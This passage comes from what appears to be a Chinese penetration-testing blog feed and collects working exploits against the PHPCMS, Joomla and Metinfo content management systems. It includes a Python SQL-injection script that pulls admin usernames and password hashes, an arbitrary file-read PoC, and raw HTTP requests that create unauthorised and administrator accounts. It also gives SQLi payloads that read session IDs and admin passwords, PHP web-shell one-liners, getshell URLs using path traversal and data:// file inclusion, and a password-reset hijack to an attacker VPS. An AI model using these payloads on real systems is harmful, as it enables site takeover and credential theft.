rel="noopener">https://zhuanlan.zhihu.com/p/26263513</a><br><a href="https://zhuanlan.zhihu.com/p/26263513" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/26263513</a><br>脚本<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import urllib</span><br><span class="line">url = sys.argv[1]</span><br><span class="line"><span class="built_in">print</span> <span class="string">'Phpcms v9.6.0 SQLi Exploit Code By Luan'</span></span><br><span class="line">sqli_prefix = <span class="string">'%*27an*d%20'</span></span><br><span class="line">sqli_info = <span class="string">'e*xp(~(se*lect%*2af*rom(se*lect co*ncat(0x6c75616e24,us*er(),0x3a,ver*sion(),0x6c75616e24))x))'</span></span><br><span class="line">sqli_password1 = <span class="string">'e*xp(~(se*lect%*2afro*m(sel*ect co*ncat(0x6c75616e24,username,0x3a,password,0x3a,encrypt,0x6c75616e24) fr*om '</span></span><br><span class="line">sqli_password2 = <span class="string">'_admin li*mit 0,1)x))'</span></span><br><span class="line">sqli_padding = <span class="string">'%23%26m%3D1%26f%3Dwobushou%26modelid%3D2%26catid%3D6'</span></span><br><span class="line">setp1 = url + <span class="string">'/index.php?m=wap&amp;a=index&amp;siteid=1'</span></span><br><span class="line">cookies = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> requests.get(setp1).cookies:</span><br><span class="line">    <span class="keyword">if</span> c.name[-7:] == <span class="string">'_siteid'</span>:</span><br><span class="line">        cookie_head = c.name[:6]</span><br><span class="line">        cookies[cookie_head+<span class="string">'_userid'</span>] = c.value</span><br><span class="line">    cookies[c.name] = c.value</span><br><span class="line"><span class="built_in">print</span> <span class="string">'[+] Get Cookie : '</span> + str(cookies)</span><br><span class="line">setp2 = url + <span class="string">'/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id='</span> + sqli_prefix + urllib.quote_plus(sqli_info, safe=<span class="string">'qwertyuiopasdfghjklzxcvbnm*'</span>) + sqli_padding</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> requests.get(setp2,cookies=cookies).cookies:</span><br><span class="line">    <span class="keyword">if</span> c.name[-9:] == <span class="string">'_att_json'</span>:</span><br><span class="line">        sqli_payload = c.value</span><br><span class="line"><span class="built_in">print</span> <span class="string">'[+] Get SQLi Payload : '</span> + sqli_payload</span><br><span class="line">setp3 = url + <span class="string">'/index.php?m=content&amp;c=down&amp;a_k='</span> + sqli_payload</span><br><span class="line">html = requests.get(setp3,cookies=cookies).content</span><br><span class="line"><span class="built_in">print</span> <span class="string">'[+] Get SQLi Output : '</span> + html.split(<span class="string">'luan$'</span>)[1]</span><br><span class="line">table_prefix = html[html.find(<span class="string">'_download_data'</span>)-2:html.find(    <span class="string">'_download_data'</span>)]</span><br><span class="line"><span class="built_in">print</span> <span class="string">'[+] Get Table Prefix : '</span> + table_prefix</span><br><span class="line">setp2 = url + <span class="string">'/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id='</span> + sqli_prefix + urllib.quote_plus(sqli_password1, safe=<span class="string">'qwertyuiopasdfghjklzxcvbnm*'</span>) + table_prefix + urllib.quote_plus(sqli_password2, safe=<span class="string">'qwertyuiopasdfghjklzxcvbnm*'</span>) + sqli_padding</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> requests.get(setp2,cookies=cookies).cookies:</span><br><span class="line">    <span class="keyword">if</span> c.name[-9:] == <span class="string">'_att_json'</span>:</span><br><span class="line">sqli_payload = c.value</span><br><span class="line"><span class="built_in">print</span> <span class="string">'[+] Get SQLi Payload : '</span> + sqli_payload</span><br><span class="line">setp3 = url + <span class="string">'/index.php?m=content&amp;c=down&amp;a_k='</span> + sqli_payload</span><br><span class="line">html = requests.get(setp3,cookies=cookies).content</span><br><span class="line"><span class="built_in">print</span> <span class="string">'[+] Get SQLi Output : '</span> + html.split(<span class="string">'luan$'</span>)[1]</span><br></pre></td></tr></table></figure></p><h1 id="PHPCMS-V9最新版本后台设计缺陷导致getshell"><a href="#PHPCMS-V9最新版本后台设计缺陷导致getshell" class="headerlink" title="PHPCMS V9最新版本后台设计缺陷导致getshell"></a>PHPCMS V9最新版本后台设计缺陷导致getshell</h1><p><a href="http://docs.ioin.in/writeup/www.cnbraid.com/_2016_09_14_phpcms_/index.html" target="_blank" rel="noopener">http://docs.ioin.in/writeup/www.cnbraid.com/_2016_09_14_phpcms_/index.html</a><br><img src="/posts/../../images/cms/phpcms2.png" alt=""><br>一句话添加到如下位置<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">\phpsso_server\caches\configs\uc_config.php</span><br></pre></td></tr></table></figure></p><h1 id="PHPCMS-V9-6-1-任意文件读取漏洞分析（含PoC，已有补丁）"><a href="#PHPCMS-V9-6-1-任意文件读取漏洞分析（含PoC，已有补丁）" class="headerlink" title="PHPCMS V9.6.1 任意文件读取漏洞分析（含PoC，已有补丁）"></a>PHPCMS V9.6.1 任意文件读取漏洞分析（含PoC，已有补丁）</h1><p><a href="https://paper.tuisec.win/detail/31d4818dd77e874" target="_blank" rel="noopener">https://paper.tuisec.win/detail/31d4818dd77e874</a><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="string">''</span><span class="string">'</span></span><br><span class="line"><span class="string">name: PHPCMS v9.6.1 任意文件下载</span></span><br><span class="line"><span class="string">author: Anka9080</span></span><br><span class="line"><span class="string">description: 过滤函数不严谨导致任意文件下载。</span></span><br><span class="line"><span class="string">'</span><span class="string">''</span></span><br><span class="line">import sys</span><br><span class="line">import requests</span><br><span class="line">from termcolor import cprint</span><br><span class="line"></span><br><span class="line">def poc(target):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'第一次请求，获取 cookie_siteid '</span>)</span><br><span class="line">    url = target +<span class="string">'index.php?m=wap&amp;c=index&amp;a=init&amp;siteid=1'</span></span><br><span class="line">    s = requests.Session()</span><br><span class="line">    r = s.get(url)</span><br><span class="line">    cookie_siteid =  r.headers[<span class="string">'set-cookie'</span>]</span><br><span class="line">    cookie_siteid = cookie_siteid[cookie_siteid.index(<span class="string">'='</span>)+1:]</span><br><span class="line">    <span class="comment"># print cookie_siteid</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'第二次请求，获取 att_json '</span>)</span><br><span class="line">    </span><br><span class="line">    url = target + <span class="string">'index.php?m=attachment&amp;c=attachments&amp;&amp;a=swfupload_json&amp;aid=1&amp;src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D2%26catid%3D6%26s%3D./phpcms/modules/content/down.ph%26f%3Dp%3%25252%2*70C'</span></span><br><span class="line">    post_data = &#123;</span><br><span class="line">        <span class="string">'userid_flash'</span>:cookie_siteid</span><br><span class="line">    &#125;</span><br><span class="line">    r = s.post(url,post_data)</span><br><span class="line">    <span class="comment"># print r.headers</span></span><br><span class="line">    <span class="keyword">for</span> cookie <span class="keyword">in</span> s.cookies:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'_att_json'</span> <span class="keyword">in</span> cookie.name:</span><br><span class="line">            cookie_att_json = cookie.value</span><br><span class="line">    <span class="comment"># print cookie_att_json</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'第三次请求，获取 文件下载链接 '</span>)</span><br><span class="line">    url = target + <span class="string">'index.php?m=content&amp;c=down&amp;a=init&amp;a_k='</span> + cookie_att_json</span><br><span class="line">    r = s.get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'m=content&amp;c=down&amp;a=download&amp;a_k='</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        cprint(<span class="string">'[!] Vul : &#123;&#125;'</span>.format(target),<span class="string">'red'</span>)</span><br><span class="line">        <span class="built_in">return</span> True</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">return</span> False</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line"></span><br><span class="line">    poc(<span class="string">'http://localhost/PHPCMS/PHPCMS_v9.6.1/'</span>)</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="渗透测试" scheme="http://note.cfyqy.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="漏洞" scheme="http://note.cfyqy.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="cms" scheme="http://note.cfyqy.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E/cms/"/>
    
    
      <category term="渗透测试" scheme="http://note.cfyqy.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="漏洞" scheme="http://note.cfyqy.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="cms" scheme="http://note.cfyqy.com/tags/cms/"/>
    
  </entry>
  
  <entry>
    <title>joomla</title>
    <link href="http://note.cfyqy.com/posts/797n44d1.html"/>
    <id>http://note.cfyqy.com/posts/797n44d1.html</id>
    <published>2018-10-20T07:48:00.000Z</published>
    <updated>2018-10-21T16:17:22.094Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="可以用hashcat去破解joomla的hash加密"><a href="#可以用hashcat去破解joomla的hash加密" class="headerlink" title="可以用hashcat去破解joomla的hash加密"></a>可以用hashcat去破解joomla的hash加密</h1><p> <a href="http://www.freebuf.com/sectool/164507.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/164507.html</a></p><h1 id="JoomScan：一款开源的OWASP-Joomla漏洞扫描器"><a href="#JoomScan：一款开源的OWASP-Joomla漏洞扫描器" class="headerlink" title="JoomScan：一款开源的OWASP Joomla漏洞扫描器"></a>JoomScan：一款开源的OWASP Joomla漏洞扫描器</h1><p><a href="https://paper.tuisec.win/detail/ab43a0937e648d9" target="_blank" rel="noopener">https://paper.tuisec.win/detail/ab43a0937e648d9</a></p><h1 id="（影响版本3-4-4-to-3-6-3-）-Joomla未授权创建用户漏洞（CVE-2016-8870）分析"><a href="#（影响版本3-4-4-to-3-6-3-）-Joomla未授权创建用户漏洞（CVE-2016-8870）分析" class="headerlink" title="（影响版本3.4.4 to 3.6.3  ） Joomla未授权创建用户漏洞（CVE-2016-8870）分析"></a>（影响版本3.4.4 to 3.6.3  ） Joomla未授权创建用户漏洞（CVE-2016-8870）分析</h1><p>：       </p><p>poc:<br>在网站首页的源码中找到token,<br><img src="/posts/../../images/cms/joomla5.png" alt=""></p><p>burpsuite截取修改发送一下数据包,注意填写cookie和yourtoken值。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /index.php/component/users/?task=registration.register HTTP/1.1</span><br><span class="line">...</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryefGhagtDbsLTW5qI</span><br><span class="line">...</span><br><span class="line">Cookie: yourcookie</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryefGhagtDbsLTW5qI</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">"user[name]"</span></span><br><span class="line"></span><br><span class="line">attacker</span><br><span class="line">------WebKitFormBoundaryefGhagtDbsLTW5qI</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">"user[username]"</span></span><br><span class="line"></span><br><span class="line">attacker</span><br><span class="line">------WebKitFormBoundaryefGhagtDbsLTW5qI</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">"user[password1]"</span></span><br><span class="line"></span><br><span class="line">attacker</span><br><span class="line">------WebKitFormBoundaryefGhagtDbsLTW5qI</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">"user[password2]"</span></span><br><span class="line"></span><br><span class="line">attacker</span><br><span class="line">------WebKitFormBoundaryefGhagtDbsLTW5qI</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">"user[email1]"</span></span><br><span class="line"></span><br><span class="line">attacker@my.local</span><br><span class="line">------WebKitFormBoundaryefGhagtDbsLTW5qI</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">"user[email2]"</span></span><br><span class="line"></span><br><span class="line">attacker@my.local</span><br><span class="line">------WebKitFormBoundaryefGhagtDbsLTW5qI</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">"option"</span></span><br><span class="line"></span><br><span class="line">com_users</span><br><span class="line">------WebKitFormBoundaryefGhagtDbsLTW5qI</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">"task"</span></span><br><span class="line"></span><br><span class="line">user.register</span><br><span class="line">------WebKitFormBoundaryefGhagtDbsLTW5qI</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">"yourtoken"</span></span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">------WebKitFormBoundaryefGhagtDbsLTW5qI--</span><br></pre></td></tr></table></figure></p><p><img src="/posts/../../images/cms/joomla4.png" alt=""></p><h1 id="（-3-4-4-to-3-6-3）Joomla未授权创建特权用户漏洞（CVE-2016-8869）分析"><a href="#（-3-4-4-to-3-6-3）Joomla未授权创建特权用户漏洞（CVE-2016-8869）分析" class="headerlink" title="（ 3.4.4 to 3.6.3）Joomla未授权创建特权用户漏洞（CVE-2016-8869）分析"></a>（ 3.4.4 to 3.6.3）Joomla未授权创建特权用户漏洞（CVE-2016-8869）分析</h1><p><a href="https://paper.seebug.org/88/" target="_blank" rel="noopener">https://paper.seebug.org/88/</a><br>poc:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /index.php/component/users/?task=registration.register HTTP/1.1</span><br><span class="line">...</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryefGhagtDbsLTW5qI</span><br><span class="line">...</span><br><span class="line">Cookie: yourcookie</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryefGhagtDbsLTW5qI</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">"user[name]"</span></span><br><span class="line"></span><br><span class="line">attacker2</span><br><span class="line">------WebKitFormBoundaryefGhagtDbsLTW5qI</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">"user[username]"</span></span><br><span class="line"></span><br><span class="line">attacker2</span><br><span class="line">------WebKitFormBoundaryefGhagtDbsLTW5qI</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">"user[password1]"</span></span><br><span class="line"></span><br><span class="line">attacker2</span><br><span class="line">------WebKitFormBoundaryefGhagtDbsLTW5qI</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">"user[password2]"</span></span><br><span class="line"></span><br><span class="line">attacker2</span><br><span class="line">------WebKitFormBoundaryefGhagtDbsLTW5qI</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">"user[email1]"</span></span><br><span class="line"></span><br><span class="line">attacker2@my.local</span><br><span class="line">------WebKitFormBoundaryefGhagtDbsLTW5qI</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">"user[email2]"</span></span><br><span class="line"></span><br><span class="line">attacker2@my.local</span><br><span class="line">------WebKitFormBoundaryefGhagtDbsLTW5qI</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">"user[groups][]"</span></span><br><span class="line"></span><br><span class="line">7</span><br><span class="line">------WebKitFormBoundaryefGhagtDbsLTW5qI</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">"option"</span></span><br><span class="line"></span><br><span class="line">com_users</span><br><span class="line">------WebKitFormBoundaryefGhagtDbsLTW5qI</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">"task"</span></span><br><span class="line"></span><br><span class="line">user.register</span><br><span class="line">------WebKitFormBoundaryefGhagtDbsLTW5qI</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">"yourtoken"</span></span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">------WebKitFormBoundaryefGhagtDbsLTW5qI--</span><br></pre></td></tr></table></figure></p><p><img src="/posts/../../images/cms/joomla6.png" alt=""></p><h1 id="（1-6-0-3-6-4）Joomla-权限提升漏洞（CVE-2016-9838）分析"><a href="#（1-6-0-3-6-4）Joomla-权限提升漏洞（CVE-2016-9838）分析" class="headerlink" title="（1.6.0 - 3.6.4）Joomla 权限提升漏洞（CVE-2016-9838）分析"></a>（1.6.0 - 3.6.4）Joomla 权限提升漏洞（CVE-2016-9838）分析</h1><p>实现水平越权</p><h1 id="1-5-0到3-6-5-CVE-2017-7985-amp-7986：详细分析-Joomla！两处XSS漏洞（含exp）"><a href="#1-5-0到3-6-5-CVE-2017-7985-amp-7986：详细分析-Joomla！两处XSS漏洞（含exp）" class="headerlink" title="(1.5.0到3.6.5)CVE-2017-7985&amp;7986：详细分析 Joomla！两处XSS漏洞（含exp）"></a>(1.5.0到3.6.5)CVE-2017-7985&amp;7986：详细分析 Joomla！两处XSS漏洞（含exp）</h1><p><a href="https://paper.tuisec.win/detail/e66d7bee425440a" target="_blank" rel="noopener">https://paper.tuisec.win/detail/e66d7bee425440a</a> </p><h1 id="CVE-2017-8917-Joomla-3-7-0-SQL-Injection分析"><a href="#CVE-2017-8917-Joomla-3-7-0-SQL-Injection分析" class="headerlink" title="[CVE-2017-8917]Joomla! 3.7.0 SQL Injection分析"></a>[CVE-2017-8917]Joomla! 3.7.0 SQL Injection分析</h1><p>poc:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.0.6/joomla370/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x3e,database()),0)</span><br></pre></td></tr></table></figure></p><h1 id="Joomla-3-7-0-Core-SQL注入漏洞-利用详解及脚本"><a href="#Joomla-3-7-0-Core-SQL注入漏洞-利用详解及脚本" class="headerlink" title="Joomla!3.7.0 Core SQL注入漏洞 利用详解及脚本"></a>Joomla!3.7.0 Core SQL注入漏洞 利用详解及脚本</h1><p><a href="https://paper.tuisec.win/detail/4d6b0130767fd51" target="_blank" rel="noopener">https://paper.tuisec.win/detail/4d6b0130767fd51</a> </p><p>获取表前缀<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">updatexml(1,concat(0x5e24,(select%20*%20from%20(SELECT TABLE_NAME FROM%20information_schema.TABLE_CONSTRAINTS%20limit 1,1)aa%20),0x5e24),1)</span><br></pre></td></tr></table></figure></p><p>尝试使用substring读取指定范围数据绕过过滤：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">updatexml(1,concat(0x5e24,(select%20*%20from%20(SELECT%20substring(TABLE_NAME,1,6)%20FROM%20information_schema.TABLE_CONSTRAINTS%20limit 1,1)aa%20),0x5e24),1)</span><br></pre></td></tr></table></figure></p><h1 id="Joomla-3-70-com-fields组件sql注入及joomla3-x拿后台shell"><a href="#Joomla-3-70-com-fields组件sql注入及joomla3-x拿后台shell" class="headerlink" title="Joomla 3.70 com_fields组件sql注入及joomla3.x拿后台shell"></a>Joomla 3.70 com_fields组件sql注入及joomla3.x拿后台shell</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php <span class="variable">$sl</span> = create_function(<span class="string">''</span>, @<span class="variable">$_REQUEST</span>[<span class="string">'70sec'</span>]);<span class="variable">$sl</span>();?&gt;</span><br></pre></td></tr></table></figure><h1 id="（-lt-3-8-3-OR-gt-3-7-0-）-分析CVE-2018-6376-Joomla！，二阶SQL注入"><a href="#（-lt-3-8-3-OR-gt-3-7-0-）-分析CVE-2018-6376-Joomla！，二阶SQL注入" class="headerlink" title="（&lt;=3.8.3 OR &gt;= 3.7.0   ） 分析CVE-2018-6376 - Joomla！，二阶SQL注入"></a>（&lt;=3.8.3 OR &gt;= 3.7.0   ） 分析CVE-2018-6376 - Joomla！，二阶SQL注入</h1><p>版本&lt;=3.8.3 OR &gt;= 3.7.0<br><a href="https://www.notsosecure.com/analyzing-cve-2018-6376/" target="_blank" rel="noopener">https://www.notsosecure.com/analyzing-cve-2018-6376/</a><br>注册一个yesi的manage用户，尝试得到admin的session_id,(admin有登入)以超级管理员的权限访问程序。<br>poc:</p><p>在<br><code>administrator/index.php?option=com_admin&amp;view=profile&amp;layout=edit&amp;id=</code> save 抓包，在‘jform [params] [admin_style]’添加<code>[0]</code>,下面添加<br>payload:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r <span class="string">"joomla.txt"</span> --dbms mysql  <span class="string">"http://192.168.0.6/joomla383/administrator/index.php"</span> -D <span class="string">"joomla383"</span> --dbs</span><br></pre></td></tr></table></figure></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">extractvalue(0x0a,concat(0x0a,(select session_id from nvybl_session <span class="built_in">where</span> username=<span class="string">'admin'</span>)))</span><br></pre></td></tr></table></figure><p><img src="/posts/../../images/cms/joomla1.png" alt=""><br>在<code>administrator/index.php</code> 查看返回的session_id</p><p><img src="/posts/../../images/cms/joomla2.png" alt=""></p><p>sqlmap工具利用:<br>这里，有效负载中的’*’将作为SQLMap工具的标记，用于注入有效负载，例如：<br><img src="/posts/../../images/cms/joomla3.png" alt=""> </p><p>复制bp抓包到的内容到 <code>joomla.txt</code> 文件中<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">extractvalue(0x0a,concat(0x0a,(select @@version <span class="built_in">where</span> 1=1 AND 5231 = 5231)))</span><br><span class="line">extractvalue(0x0a,concat(0x0a,(select @@version <span class="built_in">where</span> 1=1 AND 5231 = 1623)))</span><br><span class="line">extractvalue(0x0a,concat(0x0a,(select @@version <span class="built_in">where</span> 1=1 or 7231 = 7231)))</span><br><span class="line">extractvalue(0x0a,concat(0x0a,(select @@version <span class="built_in">where</span> 1=1 union all select NULL，NULL，NULL，<span class="string">'21231231232'</span>)))</span><br></pre></td></tr></table></figure></p><p>sqlmap命令行<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r <span class="string">"joomla.txt"</span> --dbms mysql  <span class="string">"http://192.168.0.6/joomla383/administrator/index.php"</span> -D <span class="string">"joomla383"</span> --dbs</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="渗透测试" scheme="http://note.cfyqy.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="漏洞" scheme="http://note.cfyqy.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="cms" scheme="http://note.cfyqy.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E/cms/"/>
    
    
      <category term="渗透测试" scheme="http://note.cfyqy.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="漏洞" scheme="http://note.cfyqy.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="cms" scheme="http://note.cfyqy.com/tags/cms/"/>
    
  </entry>
  
  <entry>
    <title>metinfo</title>
    <link href="http://note.cfyqy.com/posts/797044V1.html"/>
    <id>http://note.cfyqy.com/posts/797044V1.html</id>
    <published>2018-10-19T10:14:00.000Z</published>
    <updated>2018-10-21T16:17:38.830Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="某CMS-5-X版本-管理员密码重置漏洞"><a href="#某CMS-5-X版本-管理员密码重置漏洞" class="headerlink" title="某CMS 5.X版本 管理员密码重置漏洞"></a>某CMS 5.X版本 管理员密码重置漏洞</h1><p><a href="https://xz.aliyun.com/t/2097" target="_blank" rel="noopener">https://xz.aliyun.com/t/2097</a><br>poc:<br>在vps上监听80端口<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvv -p 80</span><br></pre></td></tr></table></figure></p><p>访问后台登陆，重置密码  在填入管理员密码或邮箱后，抓包修改数据：在post数据后面 添加&amp;met_fd_port=12345&amp;met_host=vps的ip地址</p><p><img src="/posts/../../images/cms/metinfo1.png" alt=""><br>forward后，访问反弹到vps的链接<br><img src="/posts/../../images/cms/metinfo2.png" alt=""><br>即可重置管理员密码<br><img src="/posts/../../images/cms/metinfo3.png" alt=""></p><h1 id="某CMS-5-X版本GETSHELL漏洞合集"><a href="#某CMS-5-X版本GETSHELL漏洞合集" class="headerlink" title="某CMS 5.X版本GETSHELL漏洞合集"></a>某CMS 5.X版本GETSHELL漏洞合集</h1><h2 id="0x02-后台CVE-2017-11347补丁绕过继续Getshell"><a href="#0x02-后台CVE-2017-11347补丁绕过继续Getshell" class="headerlink" title="0x02 后台CVE-2017-11347补丁绕过继续Getshell"></a>0x02 后台CVE-2017-11347补丁绕过继续Getshell</h2><p>查找绝对路径的方法：</p><p>用安装目录下的phpinfo文件： <code>/install/phpinfo.php</code><br>利用报错信息(信息在HTML注释中，必须通过查看网页源码的方式才能获取内容，否则看上去是空白页)<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/app/system/include/public/ui/admin/top.php</span><br><span class="line">/app/system/include/public/ui/admin/box.php</span><br><span class="line">/app/system/include/public/ui/web/sidebar.php</span><br><span class="line">``` </span><br><span class="line">poc:   </span><br><span class="line">第一步，新建1.ico文件，内容为：&lt;?php phpinfo();?&gt;   </span><br><span class="line">在后台<span class="string">"地址栏图标"</span>处上传该文件。</span><br><span class="line">得到地址为：http://localhost/upload/201810/1539949959.ico</span><br><span class="line">![](../../images/cms/metinfo4.png)</span><br><span class="line">第二步，发送如下payload(注意左斜杠和右斜杠不能随意更改):  </span><br><span class="line">```bash</span><br><span class="line">http://localhost/某CMS/admin/app/physical/physical.php?action=op&amp;op=3&amp;valphy=<span class="built_in">test</span>|/..\upload/201810/1539949959.ico/..\..\..\某CMS\about\shell.php|1</span><br></pre></td></tr></table></figure></p><p><img src="/posts/../../images/cms/metinfo5.png" alt=""><br>生成地址shell地址<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://localhost/某CMS/about/shell.php</span><br></pre></td></tr></table></figure></p><p>这里生成成功但是，内容都被替换了，导致写入失败，有点疑惑？ </p><h2 id="0x04-后台olupdate文件缺陷导致Getshell"><a href="#0x04-后台olupdate文件缺陷导致Getshell" class="headerlink" title="0x04 后台olupdate文件缺陷导致Getshell"></a>0x04 后台olupdate文件缺陷导致Getshell</h2><p> poc:<br> 参数addr为生成shell的目录，生成shell的文件名sqlist.php不可控<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">192.168.0.6/metinfo531/admin/system/olupdate.php?action=sql&amp;sqlfile=1&amp;string=&lt;script language=<span class="string">"php"</span>&gt;@<span class="built_in">eval</span>(<span class="variable">$_POST</span>[yesi])&lt;/script&gt;&amp;addr=12313&amp;tableid=1000</span><br></pre></td></tr></table></figure></p><p>执行后的shell地址：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">192.168.0.6/metinfo531/admin/update/12313/sqlist.php</span><br></pre></td></tr></table></figure></p><h1 id="Metinfo5-3-10文件包含分析"><a href="#Metinfo5-3-10文件包含分析" class="headerlink" title="Metinfo5.3.10文件包含分析"></a>Metinfo5.3.10文件包含分析</h1><p><a href="https://paper.tuisec.win/detail/cad250641af3ec2" target="_blank" rel="noopener">https://paper.tuisec.win/detail/cad250641af3ec2</a>  </p><p>poc1:   </p><p>条件allow_url_include 为on ,php5.2后默认为off<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.0.6/metinfo531/admin/login/login_check.php?langset=cn&amp;depth=data://text/plain;base64,PD9waHAgcGhwaW5mbygpO2V4aXQoKTsvLw==</span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line">action=login&amp;login_name=123&amp;login_pass=123&amp;code=&amp;Submit=%E7%99%BB%E5%BD%95&amp;met_login_code=1</span><br></pre></td></tr></table></figure></p><p><img src="/posts/../../images/cms/metinfo6.png" alt=""></p><p>poc2:<br>利用协议攻击<br>看链接</p><h1 id="Metinfo-5-3-17-前台SQL注入漏洞分析"><a href="#Metinfo-5-3-17-前台SQL注入漏洞分析" class="headerlink" title="Metinfo 5.3.17 前台SQL注入漏洞分析"></a>Metinfo 5.3.17 前台SQL注入漏洞分析</h1><p><a href="https://www.leavesongs.com/PENETRATION/metinfo-5.3.17-sql-injection.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/metinfo-5.3.17-sql-injection.html</a><br>poc:<br>访问：<br><code>index.php?lang=Cn&amp;index=0000</code><br>头部添加：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">X-Rewrite-Url: 1/2/404xxx<span class="string">' union select 1,2,3,admin_pass,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29 from met_admin_table limit 1#/index.php</span></span><br></pre></td></tr></table></figure></p><p><img src="/posts/../../images/cms/metinfo8.png" alt=""></p><h1 id="Metinfo-6-0-0-任意文件读取漏洞"><a href="#Metinfo-6-0-0-任意文件读取漏洞" class="headerlink" title="Metinfo 6.0.0 任意文件读取漏洞"></a>Metinfo 6.0.0 任意文件读取漏洞</h1><p><a href="https://paper.tuisec.win/detail/89cd63e5894ee07" 